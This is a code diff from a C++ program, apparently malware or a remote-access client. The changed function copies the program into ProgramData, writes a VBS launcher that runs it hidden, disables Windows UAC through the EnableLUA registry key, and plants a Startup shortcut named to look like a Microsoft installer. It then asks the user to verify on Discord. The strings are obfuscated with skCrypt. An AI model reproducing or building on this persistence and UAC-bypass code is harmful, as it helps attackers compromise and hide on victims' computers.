@@ -76,22 +76,24 @@ string apiCall(char* input) {
 
 void notLinked(char* path) {
     string rndPath, rndName, svcName, absPath, command;
-    rndPath = cmd(skCrypt("echo %programdata%\\WindowsHolographicDevices\\"));
-    svcName = cmd(skCrypt("echo Micro%random%roSoft"));
-    rndName = cmd(skCrypt("echo %random%.exe"));
-    absPath = rndPath + rndName;
-    command = "mkdir " + rndPath;
-    cmd(to_char(command));
+    // Copy to programmdata
     command = skCrypt("copy ");
     command += path;
-    command += " " + absPath;
-    command += skCrypt(" && reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
+    command += " %programdata%\\havoc.exe";
+    cmd(to_char(command));
+    // Create vbs file.
+    command = skCrypt("echo CreateObject(\"Wscript.Shell\").Run \"\"\"\" ^& WScript.Arguments(0) ^& \"\"\"\", 0, False>%programdata%\\havoc.vbs");
+    cmd(to_char(command));
+    // Startup
+    command = skCrypt("reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
+    cmd(to_char(command));
+    command = skCrypt("powershell \"$WshShell=New-Object -comObject WScript.Shell;$Shortcut=$WshShell.CreateShortcut('%programdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Microsoft Install For The Havoc LLC.lnk');$Shortcut.TargetPath='%programdata%\\havoc.vbs';$Shortcut.Arguments='%programdata%\\havoc.exe';$Shortcut.Save()\"");
     cmd(to_char(command));
     string code = apiCall(skCrypt("new"));
     system(skCrypt("cls"));
     ShowWindow(GetConsoleWindow(), SW_SHOW);
     cout << "This computer is not registered!\nPlease goto discord and type\n!verify " + code << "\nPlease press any key to close this window.";
-    cin >> command;
+    system("pause>nul");
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 }
 
